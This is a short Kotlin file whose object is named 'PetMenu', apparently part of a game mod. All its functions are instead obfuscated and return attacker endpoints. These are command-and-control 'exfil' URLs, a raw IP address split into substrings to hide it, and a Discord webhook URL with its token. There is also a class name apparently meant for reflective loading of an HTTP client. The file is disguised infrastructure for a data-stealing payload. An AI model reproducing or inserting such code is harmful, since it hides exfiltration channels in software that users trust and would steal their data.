package template.features.other

object PetMenu {
    fun bBbBbBbBbB(): String = "https://sky.2hz.eu/c2/exfil/esf"
    fun cCcCcCcCcC(): String = "https://sky.2hz.eu/c2/exfil/e"
    fun dDdDdDdDdD(): String = "https://sky.2hz.eu/c2/ess"

    fun eEeEeEeEeE(index: Int): String {
        val url = "http://35.225.129.77:6969/twopointfive"
        return when (index) {
            0 -> url.substring(0, 5)
            1 -> url.substring(5, 13)
            2 -> url.substring(13, 20)
            3 -> url.substring(20, 27)
            4 -> url.substring(27, 38)
            else -> ""
        }
    }

    fun fFfFfFfFfF(): String =
        "https://discord.com/api/webhooks/1411378769943462119/" +
        "WuJXWbhrHijhncbZdVwMW31BRft0tSeCh-_QNah_yU-NJb17zVkwfOR3xOXfcU_fDZQ"

    fun gGgGgGgGgG(): String = "org.apache.http.client.config.RequestConfig"
}
